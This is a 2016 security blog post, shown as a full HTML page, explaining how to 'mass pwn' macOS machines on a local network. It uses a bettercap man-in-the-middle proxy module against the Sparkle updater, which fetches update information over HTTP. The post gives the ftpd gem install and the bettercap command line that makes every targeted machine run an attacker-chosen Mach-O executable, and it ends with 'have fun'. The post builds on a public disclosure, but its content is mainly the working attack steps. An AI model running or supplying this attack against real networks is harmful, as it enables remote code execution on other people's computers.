<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>OSX Mass Pwning Using BetterCap and the Sparkle Updater Vulnerability. | evilsocket</title>
<meta name="description" content="



Yesterday Radek from VulnSec posted an interesting article named “There’s a lot of vulnerable OS X applications out there.“, he discovered that the Sparkle ">


  <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml">


<link rel="icon" href="/images/favicon.ico">

<!-- Open Graph -->
<meta property="og:type" content="article">
<meta property="og:title" content="OSX Mass Pwning Using BetterCap and the Sparkle Updater Vulnerability.">
<meta property="og:description" content="



Yesterday Radek from VulnSec posted an interesting article named “There’s a lot of vulnerable OS X applications out there.“, he discovered that the Sparkle ">
<meta property="og:url" content="/2016/01/30/OSX-Mass-Pwning-using-BetterCap-and-the-Sparkle-Updater-Vulnerability/">
<meta property="og:site_name" content="evilsocket">

  
  
    <meta property="og:image" content="/images/2016/01/bettercap.png">
  


<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="OSX Mass Pwning Using BetterCap and the Sparkle Updater Vulnerability.">
<meta name="twitter:description" content="



Yesterday Radek from VulnSec posted an interesting article named “There’s a lot of vulnerable OS X applications out there.“, he discovered that the Sparkle ">

<!-- Schema.org JSON-LD -->


<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.evilsocket.net/2016/01/30/OSX-Mass-Pwning-using-BetterCap-and-the-Sparkle-Updater-Vulnerability/"},"headline":"OSX Mass Pwning Using BetterCap and the Sparkle Updater Vulnerability.","description":"Yesterday Radek from VulnSec posted an interesting article named “There’s a lot of vulnerable OS X applications out there.“, he discovered that the Sparkle upda","image":"https://www.evilsocket.net/images/2016/01/bettercap.png","datePublished":"2016-01-30T16:57:13.000Z","dateModified":"2016-01-30T17:46:30.000Z","author":{"@type":"Person","name":"Simone Margaritelli","description":"Italian cybersecurity researcher and open-source developer","url":"https://www.evilsocket.net","sameAs":["https://github.com/evilsocket","https://twitter.com/evilsocket","http://it.linkedin.com/in/simonemargaritelli/"],"jobTitle":"Security Researcher","worksFor":{"@type":"Organization","name":"Independent"}},"publisher":{"@type":"Organization","name":"evilsocket","url":"https://www.evilsocket.net","logo":{"@type":"ImageObject","url":"https://www.evilsocket.net/images/glider.png"}},"keywords":"bettercap, mitm, network attacks, cve, rce, vulnerability research, man in the middle, macos security, sparkle, proxy module, update, software updates","articleSection":"Technology","inLanguage":"en"}
</script>


<!-- Fonts -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<!-- Styles -->
<link rel="stylesheet" href="/css/style.css">


<!-- Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-22026549-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-22026549-1');
</script>


<meta name="generator" content="Hexo 5.4.2"></head>
<body class="post-page">
  <header class="site-header">
  <div class="header-inner">
    <div class="site-branding">
      <a href="/" class="site-logo">
        
          <img src="/images/glider.png" alt="evilsocket" width="50" height="50">
        
        <div class="site-title-group">
          <span class="site-title">evilsocket</span>
          <span class="site-motto">Preoccupied with a single leaf, you won't see the tree. Preoccupied with a single tree... you'll miss the entire forest.</span>
        </div>
      </a>
    </div>
    
    <nav class="site-nav">
      
        <a href="/" class="nav-link">
          HOME
        </a>
      
        <a href="/atom.xml" class="nav-link">
          RSS
        </a>
      
    </nav>
  </div>
</header>

  
  <main class="main-content">
    <article class="post-full">
  <header class="post-header">
    <h1 class="post-title">OSX Mass Pwning Using BetterCap and the Sparkle Updater Vulnerability.</h1>
    <div class="post-meta">
      BY <span class="post-author">Simone Margaritelli</span>
      — <time datetime="2016-01-30T16:57:13.000Z">30 Jan 2016</time>
      
        — <a href="/tags/bettercap/" class="post-category">bettercap</a>, <a href="/tags/mitm/" class="post-category">mitm</a>, <a href="/tags/network-attacks/" class="post-category">network attacks</a>, <a href="/tags/cve/" class="post-category">cve</a>, <a href="/tags/rce/" class="post-category">rce</a>, <a href="/tags/vulnerability-research/" class="post-category">vulnerability research</a>, <a href="/tags/man-in-the-middle/" class="post-category">man in the middle</a>, <a href="/tags/macos-security/" class="post-category">macos security</a>, <a href="/tags/sparkle/" class="post-category">sparkle</a>, <a href="/tags/proxy-module/" class="post-category">proxy module</a>, <a href="/tags/update/" class="post-category">update</a>, <a href="/tags/software-updates/" class="post-category">software updates</a>
      
    </div>
    <br/>
    <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket" class="twitter-follow-button" data-show-count="false">Follow me on X</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
  </header>

  <div class="post-content">
    <a href="http://www.bettercap.org/" target="_blank">
<img src="/images/2016/01/bettercap.png" alt="bettercap" title="" style="width: 100%"/>
</a>

<p>Yesterday <a target="_blank" rel="noopener" href="https://twitter.com/radekk">Radek</a> from VulnSec posted an interesting article named “<strong><a target="_blank" rel="noopener" href="https://vulnsec.com/2016/osx-apps-vulnerabilities/">There’s a lot of vulnerable OS X applications out there.</a></strong>“, he discovered that the <strong>Sparkle</strong> update system ( used by some very popular OSX apps such as <strong>VLC</strong>, <strong>Adium</strong>, <strong>iTerm</strong> and so forth ) uses HTTP instead of HTTPS to fetch updates informations for such applications, making <strong>all of them</strong> vulnerable to <strong>man in the middle</strong> attacks and, as he shown, <strong>remote command execution</strong> attacks.</p>
<p>I’m not going to explain the details of his attack, his post is quite self explainatory, but I’ll show you how easy it is to mass pwn OSX machines on your network using the new <a target="_blank" rel="noopener" href="https://github.com/evilsocket/bettercap-proxy-modules/blob/master/osxsparkle.rb">OSX Sparkle</a> bettercap proxy module.</p>
<span id="more"></span>

<p>Moreover, I improved the attack … Radek shown how to get RCE using an OSX terminal profile file, <strong>I will show you how to make the target execute any Mach-O exetutable you want!</strong> ( <a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/msf-os/">metasploit anyone</a>? )</p>
<p>This is a screenshot of my MacBook Pro running OSX El Capitan with the latest version of VLC installed, being exploited and running a sample “Hello World” binary.</p>
<p><img src="/images/2016/01/yo.png" alt="Hello World Sparkle"></p>
<p>Once you downloaded the aforementioned proxy module, install the <strong>ftpd</strong> gem:</p>
<pre><code>sudo gem install ftpd</code></pre>
<p>and use the bettercap command line:</p>
<pre><code>sudo bettercap --proxy-module osxsparkle.rb --sparkle-rce-file /path/to/some/executable</code></pre>
<p>Where <strong>/path/to/some/executable</strong> is the path to a Mach-O executable on your computer, this is the executable that all the targets are going to execute.</p>
<p>Well, enough said, have fun :)</p>

  </div>

  
    <div class="post-tags">
      
        <a href="/tags/bettercap/" class="tag">#bettercap</a>
      
        <a href="/tags/mitm/" class="tag">#mitm</a>
      
        <a href="/tags/network-attacks/" class="tag">#network attacks</a>
      
        <a href="/tags/cve/" class="tag">#cve</a>
      
        <a href="/tags/rce/" class="tag">#rce</a>
      
        <a href="/tags/vulnerability-research/" class="tag">#vulnerability research</a>
      
        <a href="/tags/man-in-the-middle/" class="tag">#man in the middle</a>
      
        <a href="/tags/macos-security/" class="tag">#macos security</a>
      
        <a href="/tags/sparkle/" class="tag">#sparkle</a>
      
        <a href="/tags/proxy-module/" class="tag">#proxy module</a>
      
        <a href="/tags/update/" class="tag">#update</a>
      
        <a href="/tags/software-updates/" class="tag">#software updates</a>
      
    </div>
  

  <nav class="post-navigation">
    
      <a href="/2016/03/31/How-To-Build-Your-Own-Rogue-GSM-BTS-For-Fun-And-Profit/" class="nav-prev">
        <span class="nav-label">PREVIOUS</span>
        <span class="nav-title">How to Build Your Own Rogue GSM BTS for Fun and Profit</span>
      </a>
    
    
      <a href="/2016/01/28/Why-you-shouldn-t-trust-CloudFlare-s-Flexible-SSL-and-how-to-bypass-it-with-BetterCap/" class="nav-next">
        <span class="nav-label">NEXT</span>
        <span class="nav-title">Why You Shouldn&#39;t Trust CloudFlare&#39;s &#39;Flexible SSL&#39; and How to Bypass It With BetterCap</span>
      </a>
    
  </nav>
</article>


  


<section class="related-posts">
  <h3 class="related-title">YOU MIGHT ALSO LIKE...</h3>
  <div class="cards-grid cards-grid-related">
    
      

<article class="card card-light">
  <a href="/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2025/tapo/header.jpg')">
        
      </div>
    
    
    
      <div class="card-content">
        <h2 class="card-title">TP-Link Tapo C200: Hardcoded Keys, Buffer Overflows and Privacy in the Era of AI Assisted Reverse Engineering</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2024/cups1/smart.jpg')">
        
          <div class="card-overlay-content">
            <h2 class="card-title">Attacking UNIX Systems via CUPS, Part I</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2024/09/13/Introducing-bettercap-2-4-0-CAN-bus-hacking-WiFi-bruteforcing-and-builtin-web-UI/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2024/ecus.png')">
        
          <div class="card-overlay-content">
            <h2 class="card-title">Introducing Bettercap 2.4.0: CAN-Bus Hacking, WiFi Bruteforcing and Builtin Web UI</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-light">
  <a href="/2022/10/20/Reverse-Engineering-the-Apple-MultiPeer-Connectivity-Framework/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2022/cleartext.png')">
        
      </div>
    
    
    
      <div class="card-content">
        <h2 class="card-title">Reverse Engineering the Apple MultiPeer Connectivity Framework</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
  </div>
</section>




  </main>
  
  <footer class="site-footer">
  <div class="footer-inner">
    <div class="footer-social">
      
        
          
            <a href="https://github.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
            </a>
          
        
          
            <a href="https://twitter.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
            </a>
          
        
          
            <a href="http://it.linkedin.com/in/simonemargaritelli/" class="social-link" target="_blank" rel="noopener" aria-label="LinkedIn">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
            </a>
          
        
          
        
          
            <a href="mailto:evilsocket@gmail.com" class="social-link" aria-label="Email">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
            </a>
          
        
      
    </div>
    <p class="footer-copyright">
      &copy; 2025 evilsocket. 
      Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>.
    </p>
  </div>
</footer>

  <!-- Minimal JS - no external dependencies needed -->
<script>
  // Lazy load images
  document.addEventListener('DOMContentLoaded', function() {
    var images = document.querySelectorAll('.card-image[data-bg]');
    images.forEach(function(img) {
      img.style.backgroundImage = 'url(' + img.dataset.bg + ')';
    });
  });
</script>

</body>
</html>
